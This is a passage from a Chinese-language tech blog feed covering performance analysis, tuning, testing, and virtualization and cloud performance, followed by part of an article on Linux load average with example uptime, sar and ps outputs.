<li><p>性能分析从测量开始，性能必须是能够测量的<br>性能信息的3种类型：<br>1、概要形式:例如sar、vmstat,作为入手点调查过去发生了什么，“现象”<br>2、事件记录形式:例如网络抓包（Packet Capture）<br>3、快照（Snapshot）：例如ps和top</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_A_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_A_2-7.png" alt=""></p>
<ul>
<li><p>扩展阅读：<a href="http://www.jianshu.com/p/fd6e35f529c1">《Linux性能分析模型－In 60 Seconds》</a></p>
</li>
<li><p>性能分析中的重要理论：等待队列理论<br>从性能的稳定性方面来考虑，带宽控制思维方式。<br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_S_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_S_1_2.png" alt=""></p>
</li>
</ul>
<h3 id="二、实际系统中的性能分析"><a href="#二、实际系统中的性能分析" class="headerlink" title="二、实际系统中的性能分析"></a>二、实际系统中的性能分析</h3><h4 id="AP服务器的性能测量"><a href="#AP服务器的性能测量" class="headerlink" title="AP服务器的性能测量"></a>AP服务器的性能测量</h4><p>不同语言的性能信息获取: Java：GC（垃圾回收）日志 ，全GC（Stop the world）</p>
<h4 id="DB服务器的性能测量"><a href="#DB服务器的性能测量" class="headerlink" title="DB服务器的性能测量"></a>DB服务器的性能测量</h4><p>DB服务器本身的特点就是集中管理数据，需要频繁地查看线程（会话）之间的交互，因此很容易出现资源竞争的情况，因此在进行DBMS性能分析的时候，一定要考虑多个线程的存在。</p>
<h4 id="存储性能分析的思路"><a href="#存储性能分析的思路" class="headerlink" title="存储性能分析的思路"></a>存储性能分析的思路</h4><p>思路：重视IOPS<br>术语：响应时间、IOPS（Input Output Per Second）<br>类型：物理磁盘、SSD</p>
<p>缓存命中率：在存储的世界里，磁盘、存储、OS等各处都存在着缓存，使用缓存命中率作为表示缓存工作效率的指标。<br>脏数据（或者脏数据块）：已经更新但没有写入的数据。脏数据不可以丢弃，如果在缓存上堆积了大量的脏数据，I／O就无法有效运作，进而就会导致问题的发生。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_device_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_device_2.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_device_3.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_device_3_12.png" alt=""></p>
<h4 id="网络性能分析的思路"><a href="#网络性能分析的思路" class="headerlink" title="网络性能分析的思路"></a>网络性能分析的思路</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_N_1.png" alt="ACK机制"></p>
<h4 id="调查原因"><a href="#调查原因" class="headerlink" title="调查原因"></a>调查原因</h4><ul>
<li>陷阱1:关注受害者，“疑犯”与“真凶”</li>
<li>陷阱2:没有意识到基础不稳 （自下而上）</li>
<li>陷阱3:没有注意到负载的变化</li>
<li>陷阱4:不能确定谁拿着球</li>
<li>陷阱5:不能确定因果关系<br><strong>很多人不能把握原因，而只是随便瞎猜一下就进行调优。</strong><br>掌握因果关系的一个窍门是学习架构知识。知道了机制后就能减少错误分析的情况。另外，从逻辑上来考虑因果关系是很重要的。要试着思考一下“这个现象能否解释另一个现象”。</li>
</ul>
<h3 id="三、性能调优"><a href="#三、性能调优" class="headerlink" title="三、性能调优"></a>三、性能调优</h3><ul>
<li>调优要循序渐进：先把大石头移开。</li>
<li><p>具体思路：<br>1、重复使用：连接池、PreparedStatement、线程池<br>2、汇总处理：集中、Piggyback<br>3、提高速度和实现并行<br>4、纵向扩展（Scale Up）与横向扩展（Scale Out）：</p>
</li>
<li><p>应用技巧：<br>1、省略循环<br>2、访问频率高的数据存放入键值存储<br>3、访问频率高的数据存放在使用位置附近<br>4、把同步变成异步<br>5、带宽控制<br>6、LRU算法<br>7、分割处理或者细化锁的力度<br>8、回写缓存、多层缓存<br>9、巨帧和高速网络<br>10、负载均衡 <a href="https://riboseyim.github.io/2016/09/01/AAA/">基于LVS的AAA负载均衡架构实践</a><br>11、写时复制</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Copy_1.png" alt=""></p>
<h3 id="四、性能测试"><a href="#四、性能测试" class="headerlink" title="四、性能测试"></a>四、性能测试</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Process_1.png" alt=""></p>
<h4 id="项目工程环境"><a href="#项目工程环境" class="headerlink" title="项目工程环境"></a>项目工程环境</h4><p>基于项目整理来确保应用程序的性能。</p>
<p>应用程序设计负责人一般不会考虑系统整体的性能，而是满脑子考虑如何使用新的框架和中间件来实现需要的业务和功能。</p>
<h4 id="常见的失败情况：9种反面模式"><a href="#常见的失败情况：9种反面模式" class="headerlink" title="常见的失败情况：9种反面模式"></a>常见的失败情况：9种反面模式</h4><ul>
<li>不能在期限内完成</li>
<li>性能很差！解决不了性能问题</li>
<li>由于没有考虑到环境差异而导致发生问题</li>
<li>压力场景设计不完备导致发生问题</li>
<li>没有考虑到缓冲、缓存的时候而导致发生问题</li>
<li>没有考虑到思考时间而导致发生问题</li>
<li>报告内容难以理解导致客户不能认同</li>
<li>客户因为存在不信任感而不能认同</li>
<li>测试很花时间</li>
</ul>
<p>后期工程中隐藏着性能问题，原因如下：</p>
<ul>
<li>只有在生产环境中才会出现</li>
<li>问题的显现需要很多条件（环境、数据、负载生成）</li>
<li>因为特定的操作才导致发生性能问题</li>
</ul>
<p>==&gt;&gt;为系统中的性能测试流出一个月的时间。</p>
<p>对横跨多个领域的性能问题进行排查的时候，如果不能综合多个领域来考虑，负责人就会一直说“我负责的那部分没有问题”，导致问题无法解决。</p>
<p>客户关心的焦点集中在“在实际生产环境中运行时是否会出现性能方面的问题”。</p>
<p>由于不能很好地共享性能测试地整体过程，或者本来关于性能需求或性能测试设计地需求等地约定就很模糊，导致结论与评价基准等也变得很模糊，引起沟通不畅。</p>
<p><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">参考案例:Oracle数据库迁移割接实录</a></p>
<h4 id="需求定义"><a href="#需求定义" class="headerlink" title="需求定义"></a>需求定义</h4><p>三要素：吞吐（T）、响应时间（R）、用户并发度（U）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">U x R = T</span><br></pre></td></tr></table></figure>
<p>并发并不是作为性能目标通过听取客户意见来推导出来的，而是通常根据吞吐和响应时间计算出一个合适的值（客户即使了解业务中同时使用的人数，但是对于系统瞬间运行的并发处理的情况，他们并不清楚）。</p>
<h4 id="集成测试：多并发运行测试"><a href="#集成测试：多并发运行测试" class="headerlink" title="集成测试：多并发运行测试"></a>集成测试：多并发运行测试</h4><h4 id="系统测试：压力测试、临界测试、耐久测试"><a href="#系统测试：压力测试、临界测试、耐久测试" class="headerlink" title="系统测试：压力测试、临界测试、耐久测试"></a>系统测试：压力测试、临界测试、耐久测试</h4><h4 id="运维测试：性能监控测试、故障测试"><a href="#运维测试：性能监控测试、故障测试" class="headerlink" title="运维测试：性能监控测试、故障测试"></a>运维测试：性能监控测试、故障测试</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Test_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Test_Day_1.png" alt=""></p>
<h3 id="五、虚拟化环境下的性能"><a href="#五、虚拟化环境下的性能" class="headerlink" title="五、虚拟化环境下的性能"></a>五、虚拟化环境下的性能</h3><p>在虚拟化环境中，多个VM（虚拟机）运行在一台服务器上，因此可以更加有效地共享资源，有利于削减成本。而反过来，若资源被共享过度，则会发生竞争，可能导致性能的下降。因此，在资源效率和性能之间取得平衡就变得尤为重要。<br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_VM_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_VMM_TYPE_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_VM_RES_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_VM_RES_2.png" alt=""></p>
<h4 id="虚拟化的性能管理（CPU）"><a href="#虚拟化的性能管理（CPU）" class="headerlink" title="虚拟化的性能管理（CPU）"></a>虚拟化的性能管理（CPU）</h4><p>虚拟环境下Guest OS发出的特权命令会被更改，因此和物理环境相比需要更多的处理时间。另外，物理环境下也不需要将逻辑CPU分配个VM的调度处理，如果CPU的分配发生了竞争，这个等待时间就会影响性能。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_VM_Cloud.png" alt=""></p>
<h3 id="六、云计算环境下的性能"><a href="#六、云计算环境下的性能" class="headerlink" title="六、云计算环境下的性能"></a>六、云计算环境下的性能</h3><ul>
<li>构成计算资源的技术元素并没有大的变化</li>
<li>网络访问和资源的使用及提供形态发生了变化</li>
<li>LAN网络的变化</li>
<li>WAN网络的变化</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Cloud_deploy_1.png" alt=""></p>
<p>云计算的一个大的变化就是LAN网络。具体来说，本地部署环境下物理路由器和交换机实现的部分被隐藏起来，通过虚拟的网络来组成。</p>
<p>WAN连接方法：<br>1、专线连接：主要依赖于所选择的通信运营商的服务特性，带宽保证和性能的成本与之前相比并没有太大变化。<br>2、互联网连接：云计算服务可以非常优惠的加个来利用共享的互联网带宽，可以减轻高峰时带宽限制的顾虑。云计算服务中提供的CDN（Contents Delivery Network）或Global DNS等功能，能够很方便地提高互联网服务的速度。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_front_web.png" alt=""></p>
<p>随着存储的网络化，直接连接到普通的LAN的情况也越来越多，磁盘I/O变为网络I／O的情况也越来越多。在NAS（Network Attached Storage）以及云环境下，磁盘I/O在普通的TCP／IP网络中完成的情况也很多。（具体第7章）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Store_Change.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_VM_Cloud.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Network_Change.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_Network_Change_2.png" alt=""></p>
<h4 id="云计算环境中开发阶段的思维方式"><a href="#云计算环境中开发阶段的思维方式" class="headerlink" title="云计算环境中开发阶段的思维方式"></a>云计算环境中开发阶段的思维方式</h4><p>在云计算环境下，比起技术方面的差异，思维方式上的差异更为明显。在实际业务层面最大的变化就是对以往的以硬件配置为前提的开发运维流程的影响。</p>
<p>1、基本设计：估算（Sizing）<br>2、系统测试：性能测试<br>3、项目管理</p>
<p>云计算环境中不需要准备硬件，但是并不代表不需要进行估算。<br>观点一：成本估算。成本会根据选定的资源大小而有所变化。<br>观点二：临界估算。在本地部署环境下，企业级系统很多都是集中式的处理方式，如果按照这种方式原封不懂地迁移到云计算环境，可能就会碰到瓶颈，为了消除这种风险，就需要进行估算，考虑临界容量的可实现性。</p>
<p><strong>POC：Proof of Concept (概念验证)</strong><br>云计算的情况下，能在瞬间准备好多种模式的环境用于验证，可通过POC来验证运行情况、搭建模式与费用。</p>
<p>在云计算环境下，容量管理与成本管理是一体的。</p>
<p>云计算服务的核心是根据负载使用量收费。由于这种收费模式，原来只有工程师会关注的传送量、I／O数、HTTP请求数等详细的性能指标数据会直接反映在费用上，因此需要经营者掌握这些性能指标及其含义。使用云计算后，容量与成本就联系到一起，因此云计算可能是促使经营者学习容量分析的一个有效手段。</p>
<p>运维：除了应对峰值，在没有业务流量的时间段内动态削减多余的资源，降低成本，也是很有价值的。</p>
<h2 id="扩展阅读：电子书《Linux-Perf-Master》"><a href="#扩展阅读：电子书《Linux-Perf-Master》" class="headerlink" title="扩展阅读：电子书《Linux Perf Master》"></a>扩展阅读：电子书《Linux Perf Master》</h2><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：启动</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：空间管理</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：内存管理</a></li>
<li><a href="https://riboseyim.github.io/2018/01/08/Linux-Works-Network/">操作系统原理 | How Linux Works（三）：网络管理</a></li>
</ul>
<h2 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h2><ul>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 性能诊断:负载评估</title>
    <url>/2017/12/11/Linux-Perf-Load/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>基于 Linux 单机的负载评估</li>
<li>负载诊断流程</li>
<li>概念：什么是负载</li>
<li>负载：CPU 还是 I/O</li>
<li>Linux 内核进程调度器</li>
</ul>
<span id="more"></span>
<h4 id="概要：负载诊断流程"><a href="#概要：负载诊断流程" class="headerlink" title="概要：负载诊断流程"></a>概要：负载诊断流程</h4><ul>
<li>观察load average (平均负载)</li>
<li>观察CPU、I/O是否存在瓶颈</li>
</ul>
<p>从load avgerage等总括性的数据着手，参考CPU使用率和I/O等待时间等具体的数字，从而自顶向下快速排查各进程状态。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1037849-acc425a500206316.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="perf-flow"></p>
<h2 id="概念：什么是负载"><a href="#概念：什么是负载" class="headerlink" title="概念：什么是负载?"></a>概念：什么是负载?</h2><p>负载可以分为两大部分：CPU负载、I/O 负载 。</p>
<h4 id="load-average"><a href="#load-average" class="headerlink" title="load average"></a>load average</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">uptime</span><br><span class="line">top</span><br><span class="line">cat /proc/loadavg</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">load average:<span class="number">0.65</span>, <span class="number">1.49</span>, <span class="number">1.76</span>  （负载很低）</span><br><span class="line">load average:<span class="number">3.49</span>, <span class="number">3.67</span>, <span class="number">3.75</span>  （负载一般）</span><br><span class="line">load average:<span class="number">33.20</span>, <span class="number">18.39</span>, <span class="number">15.21</span> (负载高)</span><br><span class="line">load average:<span class="number">70.25</span>, <span class="number">80.50</span>, <span class="number">95.38</span> (负载非常高，需要干预)</span><br><span class="line"></span><br><span class="line">load average:<span class="number">7.89</span>, <span class="number">11.42</span>, <span class="number">13.42</span>  (当前负载趋于下降)</span><br><span class="line">load average:<span class="number">17.89</span>, <span class="number">13.28</span>, <span class="number">4.45</span> (当前负载趋于上升)</span><br></pre></td></tr></table></figure>
<p>依次时过去1分钟，5分钟，15分钟内，单位时间的等待任务数，也就是表示平均有多少任务正处于等待状态。在load average较高的情况下，就说明等待运行的任务较多，因此轮到该任务运行的等待时间就会出现较大延迟，即反映了此时负载较高。</p>
<h4 id="Linux-内核进程调度器（Process-Scheduler）"><a href="#Linux-内核进程调度器（Process-Scheduler）" class="headerlink" title="Linux 内核进程调度器（Process Scheduler）"></a>Linux 内核进程调度器（Process Scheduler）</h4><p>负责决定任务运行的优先级，以及让任务等待或使之重新开始等核心工作。调度器划分并管理进程（Process）的状态。例如：</p>
<p><strong>等待分配CPU资源的状态</strong></p>
<p><strong>等待磁盘输入输出完毕的状态</strong></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1037849-dd82c356bdda926d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="process-flow.png"></p>
<p><strong>进程描述符的状态</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>进程状态</strong></th>
<th>PS Stat</th>
<th><strong>说明</strong></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>TASK_RUNNING</td>
<td>R(Run)</td>
<td>运行状态。只要CPU空闲，随时都可以开始。</td>
<td></td>
</tr>
<tr>
<td>TASK_INTERRUPTIBLE</td>
<td>S(Sleep)</td>
<td>可中断的等待状态。例如系统睡眠或来自于用户输入的等待等。</td>
<td></td>
</tr>
<tr>
<td>TASK_UNINTERRUPTIBLE</td>
<td>D(Disk Sleep)</td>
<td>不可中断的等待状态。主要为短时间恢复时的等待状态。例如磁盘输入输出的等待</td>
<td></td>
</tr>
<tr>
<td>TASK_STOPPED</td>
<td></td>
<td>响应暂停信号而运行中断的状态。直到恢复（Resume）前都不会被调度</td>
<td></td>
</tr>
<tr>
<td>TASK_ZOMBIE</td>
<td>Z(Zombie)</td>
<td>僵死状态。虽然子进程已经终止（exit）,但父进程尚未执行wait(),因此该进程的资源没有被系统释放</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>TASK_RUNNING 正在运行</li>
<li>TASK_RUNNING （等待状态，加权换算）</li>
<li>TASK_INTERRUPTIBLE（等待状态，加权换算）</li>
<li>TASK_UNINTERRUPTIBLE（等待状态，不加权换算）</li>
</ul>
<p>load average 表示“等待进程的平均数”，除了“TASK_RUNNING正在运行”，其它三个都是等待状态。TASK_INTERRUPTIBLE不被换算。即只换算“虽然需要即刻运行处理，但是无论如何都必须等待”。</p>
<p>load average所描述的负载就是：需要运行处理，但又必需等待队列前的进程处理完成的进程个数。具体来说：要么等待授予CPU运行权限，要么等待磁盘I/O完成。</p>
<ul>
<li>内核函数：kernei/timer.c的calc-load();</li>
<li>调用周期：每次计时器中断（centos为4ms）</li>
</ul>
<h4 id="CPU-还是-I-O"><a href="#CPU-还是-I-O" class="headerlink" title="CPU 还是 I/O  ?"></a>CPU 还是 I/O  ?</h4><p>load average的数字只是表示等待的任务数，仅根据load average并不能判断具体是CPU负载高还是I/O负载高。</p>
<p><strong>CPU密集型程序</strong></p>
<p><strong>I/O密集型程序</strong></p>
<h4 id="Sar-System-Activity-Reporter"><a href="#Sar-System-Activity-Reporter" class="headerlink" title="Sar (System Activity Reporter)"></a>Sar (System Activity Reporter)</h4><p>CPU使用率和I/O等待时间都是在不断变化的，可以通过sar 命令来确认这些指标。<br>sar 工具包含在 sysstat 软件包内。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ sar</span><br><span class="line">Linux    <span class="number">04</span>/<span class="number">17</span>/<span class="number">16</span>        _x86\_64_        (<span class="number">24</span> CPU)</span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span>        CPU     %user     %nice   %system   %iowait    %steal     %idle</span><br><span class="line"><span class="number">00</span>:<span class="number">10</span>:<span class="number">02</span>        all      <span class="number">1.26</span>      <span class="number">0.00</span>      <span class="number">0.55</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">98.19</span></span><br><span class="line"><span class="number">00</span>:<span class="number">20</span>:<span class="number">01</span>        all      <span class="number">1.58</span>      <span class="number">0.00</span>      <span class="number">1.04</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">97.38</span></span><br><span class="line"><span class="number">00</span>:<span class="number">30</span>:<span class="number">01</span>        all      <span class="number">1.23</span>      <span class="number">0.00</span>      <span class="number">0.56</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">98.21</span></span><br><span class="line"><span class="number">00</span>:<span class="number">40</span>:<span class="number">01</span>        all      <span class="number">1.59</span>      <span class="number">0.00</span>      <span class="number">1.01</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">97.40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">50</span>:<span class="number">01</span>        all      <span class="number">1.35</span>      <span class="number">0.00</span>      <span class="number">0.59</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">98.06</span></span><br><span class="line"><span class="number">01</span>:<span class="number">00</span>:<span class="number">01</span>        all      <span class="number">1.63</span>      <span class="number">0.00</span>      <span class="number">1.10</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">97.27</span></span><br><span class="line"><span class="number">01</span>:<span class="number">10</span>:<span class="number">01</span>        all      <span class="number">1.22</span>      <span class="number">0.00</span>      <span class="number">0.54</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">98.24</span></span><br><span class="line"><span class="number">01</span>:<span class="number">20</span>:<span class="number">01</span>        all      <span class="number">1.68</span>      <span class="number">0.00</span>      <span class="number">1.06</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">97.25</span></span><br><span class="line"><span class="number">01</span>:<span class="number">30</span>:<span class="number">01</span>        all      <span class="number">1.23</span>      <span class="number">0.00</span>      <span class="number">0.54</span>      <span class="number">0.00</span>      <span class="number">0.00</span>     <span class="number">98.23</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ sar <span class="number">1</span> <span class="number">10</span></span><br><span class="line"><span class="number">18</span>:<span class="number">54</span>:<span class="number">58</span>    %usr    %sys    %wio   %idle</span><br><span class="line"><span class="number">18</span>:<span class="number">54</span>:<span class="number">59</span>      <span class="number">18</span>       <span class="number">3</span>       <span class="number">0</span>      <span class="number">79</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">00</span>      <span class="number">46</span>      <span class="number">14</span>       <span class="number">0</span>      <span class="number">40</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">01</span>      <span class="number">38</span>      <span class="number">13</span>       <span class="number">0</span>      <span class="number">49</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">02</span>      <span class="number">17</span>       <span class="number">4</span>       <span class="number">0</span>      <span class="number">79</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">03</span>      <span class="number">11</span>       <span class="number">4</span>       <span class="number">0</span>      <span class="number">85</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">04</span>      <span class="number">12</span>       <span class="number">5</span>       <span class="number">0</span>      <span class="number">83</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">05</span>      <span class="number">20</span>       <span class="number">4</span>       <span class="number">0</span>      <span class="number">76</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">06</span>      <span class="number">22</span>       <span class="number">3</span>       <span class="number">0</span>      <span class="number">75</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">07</span>      <span class="number">21</span>       <span class="number">4</span>       <span class="number">0</span>      <span class="number">75</span></span><br><span class="line"><span class="number">18</span>:<span class="number">55</span>:<span class="number">08</span>      <span class="number">17</span>       <span class="number">4</span>       <span class="number">0</span>      <span class="number">79</span></span><br></pre></td></tr></table></figure>
<p>输出参数:</p>
<ul>
<li>%user:用户(一般的应用软件运作模式)CPU资源</li>
<li>%system:系统（内核运作）占用CPU资源</li>
<li>%iowait:I/O等待率。</li>
</ul>
<h2 id="进程详细"><a href="#进程详细" class="headerlink" title="进程详细"></a>进程详细</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ ps auxw</span><br><span class="line">test <span class="number">1551</span> <span class="number">0.2</span> <span class="number">0.1</span> <span class="number">6452</span> <span class="number">4776</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  Test.pl CTP00004.PRS00034 <span class="number">1</span> <span class="number">300</span></span><br><span class="line">test <span class="number">1553</span> <span class="number">2.6</span> <span class="number">0.4</span> <span class="number">18196</span> <span class="number">16424</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  /Test.pl <span class="number">00001.</span>PRS00034</span><br><span class="line">test <span class="number">1555</span> <span class="number">2.6</span> <span class="number">0.4</span> <span class="number">18168</span> <span class="number">16396</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  /Test.pl <span class="number">00002.</span>PRS00034</span><br><span class="line">test <span class="number">1557</span> <span class="number">2.8</span> <span class="number">0.4</span> <span class="number">18132</span> <span class="number">16432</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  /Test.pl <span class="number">00004.</span>PRS00034</span><br><span class="line">test <span class="number">1606</span> <span class="number">0.0</span> <span class="number">0.0</span> <span class="number">50060</span> <span class="number">916</span> ? Sl <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span> /bin/PingTest -f CTP00004</span><br><span class="line">test <span class="number">1612</span> <span class="number">2.5</span> <span class="number">0.4</span> <span class="number">18156</span> <span class="number">16452</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  /Test.pl <span class="number">00014.</span>PRS00034</span><br><span class="line">test <span class="number">1629</span> <span class="number">2.1</span> <span class="number">0.4</span> <span class="number">18416</span> <span class="number">16696</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  /Test.pl <span class="number">00015.</span>PRS00034</span><br><span class="line">test <span class="number">2253</span> <span class="number">2.7</span> <span class="number">0.3</span> <span class="number">12868</span> <span class="number">11160</span> ? R <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  -w mrtg MRTG\_00027.cfg <span class="built_in">log</span></span><br><span class="line">test <span class="number">2254</span> <span class="number">3.6</span> <span class="number">0.3</span> <span class="number">12864</span> <span class="number">11184</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  -w mrtg MRTG\_00028.cfg <span class="built_in">log</span></span><br><span class="line">test <span class="number">2261</span> <span class="number">2.4</span> <span class="number">0.2</span> <span class="number">12640</span> <span class="number">11004</span> ? S <span class="number">19</span>:<span class="number">25</span> <span class="number">0</span>:<span class="number">00</span>  -w mrtg MRTG\_00030.cfg <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
<p>输出参数：</p>
<ul>
<li>%CPU：该进程的CPU使用率</li>
<li>%memb：物理内存百分比</li>
<li>VSZ、RSS：虚拟／物理内存</li>
<li>STAT：进程状态（非常重要）</li>
<li>TIME：CPU占用时间</li>
</ul>
<h4 id="SWAP吞吐"><a href="#SWAP吞吐" class="headerlink" title="SWAP吞吐"></a>SWAP吞吐</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$sar -W</span><br><span class="line"><span class="number">17</span>:<span class="number">20</span>:<span class="number">01</span>     pswpin/s pswpout/s</span><br><span class="line"><span class="number">17</span>:<span class="number">30</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">17</span>:<span class="number">40</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">17</span>:<span class="number">50</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">18</span>:<span class="number">10</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">18</span>:<span class="number">20</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">18</span>:<span class="number">30</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">18</span>:<span class="number">40</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">18</span>:<span class="number">50</span>:<span class="number">02</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>:<span class="number">01</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line"><span class="number">19</span>:<span class="number">10</span>:<span class="number">02</span>         <span class="number">0.00</span>      <span class="number">0.00</span></span><br><span class="line">Average:         <span class="number">0.00</span>      <span class="number">0.00</span></span><br></pre></td></tr></table></figure>
